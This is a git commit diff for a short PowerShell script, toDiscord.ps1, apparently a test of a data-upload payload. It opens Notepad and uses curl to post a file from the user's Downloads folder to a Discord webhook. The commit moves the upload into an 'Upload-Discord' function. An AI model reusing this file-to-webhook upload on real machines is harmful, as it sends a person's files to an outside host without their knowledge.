94ee3fe73e89e6eceecaae4e4df22dee5adfe643
SolidPiku <85856662+SolidPiku@users.noreply.github.com>
2024-11-05 12:05:44 -0600

    Update toDiscord.ps1

--- toDiscord.ps1
+++ toDiscord.ps1
@@ -1,8 +1,8 @@
 Start-Process 'C:\windows\system32\notepad.exe'
 
-$wh = "https://discord.com/api/webhooks/$wh"
 $path = "$env:USERPROFILE\Downloads\test.txt\"
 
-Set-Clipboard -Value "$path"
-
+function Upload-Discord {
+$wh = "https://discord.com/api/webhooks/$wh"
 curl.exe -F "payload_json={\`"username\`": \`"Tester\`", \`"content\`": \`"New test\`"}" -F "file=@\`"$path`"" $wh
+}
